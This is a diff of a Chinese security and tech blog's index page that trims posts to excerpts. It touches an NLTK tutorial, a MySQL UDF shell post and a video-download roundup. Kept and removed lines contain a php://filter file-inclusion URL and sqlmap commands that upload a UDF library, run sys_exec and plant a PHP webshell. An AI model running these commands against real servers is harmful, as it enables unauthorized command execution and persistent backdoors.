@@ -133,7 +133,7 @@ http://x/owlur/index.php?page=php://filter/string.rot13/resource=ndex
   </header>
 
 
-  <div class="entry-content"><p>前面虽然对<a href="http://blog.ourren.com/?p=89331">nltk分句和分词</a>进行了分析和实现，但是在进一步进行处理之前，我们需要对这些词语进行规范化处理，例如我们需要统一所有单词的大小写，词语时态问题「相同的单词在不同的时态句型中属于不同的单词，我们需要转换为同一单词」等。nltk则针对问题提供了相关的类库，主要有两类操作：词干提取，词性标注。</p>
+  <div class="entry-content"><p>前面虽然对「nltk分句和分词」进行了分析和实现，但是在进一步进行处理之前，我们需要对这些词语进行规范化处理，例如我们需要统一所有单词的大小写，词语时态问题「相同的单词在不同的时态句型中属于不同的单词，我们需要转换为同一单词」等。nltk则针对问题提供了相关的类库，主要有两类操作：词干提取，词性标注。</p>
 
 <h3>词干提取</h3>
 
@@ -190,42 +190,15 @@ http://x/owlur/index.php?page=php://filter/string.rot13/resource=ndex
 <pre><code> python sqlmap.py -u 'http://xxxx' --file-write=/lib_mysqludf_sys.so 
  --file-dest=/usr/lib/mysql/plugin/
 </code></pre></li>
-<li><p>激活存储过程「sys_exec」函数:</p>
-
-<pre><code> python sqlmap.py -u 'http://xxxx' --sql-shell
-
- CREATE FUNCTION sys_exec RETURNS STRING SONAME lib_mysqludf_sys.so
-
- SELECT * FROM information_schema.routines
-
- sys_exec(id);
-</code></pre></li>
-<li><p>也利用sqlmap上传后门程序：</p>
-
-<pre><code> python sqlmap.py -u 'http://xxx'  --file-write=C:/phpspy.php --file-dest=/var/www/spy.php
-</code></pre></li>
 </ol>
 
-
-<h3>测试环境</h3>
-
-<ul>
-<li>Linux Ubuntu 11.04 (Natty Narwhal)</li>
-<li>PHP 5.3.5, Apache 2.2.17</li>
-<li>MySQL 5.0</li>
-</ul>
-
-
-<h3>参考资料</h3>
-
-<ol>
-<li><a href="http://forelsec.blogspot.com/2012/08/solving-pwn0s-v2.html">http://forelsec.blogspot.com/2012/08/solving-pwn0s-v2.html</a></li>
-<li><a href="https://github.com/mysqludf/lib_mysqludf_sys">https://github.com/mysqludf/lib_mysqludf_sys</a></li>
-<li><a href="https://code.google.com/p/mysql-udf-http/">https://code.google.com/p/mysql-udf-http/</a></li>
-</ol>
 
 </div>
   
+  
+    <footer>
+      <a rel="full-article" href="/2015/03/10/linux_mysql_udf_shell/">继续阅读 →</a>
+    </footer>
   
 
 
@@ -316,37 +289,12 @@ http://x/owlur/index.php?page=php://filter/string.rot13/resource=ndex
 </ul>
 
 
-<p>跟clipconverter类似的网站很多，列举如下：</p>
-
-<ul>
-<li><a href="http://en.savefrom.net/">http://en.savefrom.net/</a>;</li>
-<li><a href="https://d.jaylab.org/">https://d.jaylab.org/</a>;</li>
-<li><a href="http://kej.tw/flvretriever/">http://kej.tw/flvretriever/</a>;</li>
-<li><a href="http://keepvid.com/">http://keepvid.com/</a>;</li>
-</ul>
-
-
-<h4>使用下载工具</h4>
-
-<p>Windows/Linux/Mac上都有对应的下载工具，同时Firefox也有类似的插件可以下载视频；</p>
-
-<ul>
-<li><a href="https://www.4kdownload.com/">4kdownload</a>支持多平台;</li>
-<li><a href="http://rg3.github.io/youtube-dl/">youtube-dl   </a>，支持多平台；</li>
-<li>Firefox + video downloadhelper;</li>
-</ul>
-
-
-<h4>国内视频下载</h4>
-
-<p>最后补充下国内视频「youku、tudou、ku6」等网站可以采用硕鼠进行下载：</p>
-
-<ul>
-<li><a href="http://www.flvcd.com/">硕鼠</a>，同样的使用方法，复制链接即可下载;</li>
-</ul>
-
 </div>
   
+  
+    <footer>
+      <a rel="full-article" href="/2015/02/20/youtube_video_download_summary/">继续阅读 →</a>
+    </footer>
   
 
 
